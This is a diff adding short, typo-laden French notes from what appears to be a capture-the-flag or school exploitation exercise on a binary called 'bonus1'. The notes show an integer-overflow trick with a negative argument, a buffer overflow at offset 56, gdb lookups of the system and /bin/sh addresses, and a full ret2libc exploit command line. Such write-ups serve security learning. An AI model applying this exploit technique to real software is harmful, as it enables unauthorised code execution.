@@ -1,0 +1,24 @@
+on prend l uint max /4 
+ 4294967295 / 4 = 1073741823
+
+on la met donc en neg 
+et on voit avec gdb que ca equivaut a 4
+
+on essaye donc de fr monter la valeur en soustrayant pour avoir un segfault et truver l overflow
+
+lorsque l on run avec 
+r -1073741805 ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789
+
+on otient un segfault avec comme overflow l offset 56
+
+il nous faut donc mtn l adress de /bin/sh et de system pour fr notre payload
+
+info func system apres un run vide pour system
+
+et 
+
+x/s 0x8048583 pour bin/sh
+
+ne pas oublier WASS (ou autre string de 4 lettres) pour ne pas s aeereter sur le return
+
+./bonus1 -1073741805 $(python -c 'print "B"*56+"\x60\xb0\xe6\xb7"+"WASS"+"\x83\x85\x04\x08"')
